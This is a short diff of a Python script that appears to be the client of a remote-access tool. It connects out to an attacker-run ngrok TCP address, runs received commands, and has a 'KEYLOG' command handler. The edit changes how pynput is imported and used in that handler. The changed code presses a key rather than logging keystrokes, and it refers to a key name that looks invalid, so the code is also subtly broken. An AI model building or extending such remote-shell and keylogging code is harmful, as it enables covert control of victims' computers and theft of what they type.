@@ -11,7 +11,7 @@ import time
 import threading
 import subprocess
 import base64
-from pynput import Key, Controller
+import pynput
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
 address = "0.tcp.jp.ngrok.io" # address
@@ -60,8 +60,8 @@ def execute_command(command, sock):
     try:
         #Keylogging command
         if command.startswith("KEYLOG"):
-          keyboard = controller()
-          keyboard.press('a')
+          keyboard = pynput.keyboard.Controller()
+          keyboard.press(pynput.keyboard.Key.a)
         # Special handling for "cd" command
         if command.startswith("cd "):
             try:
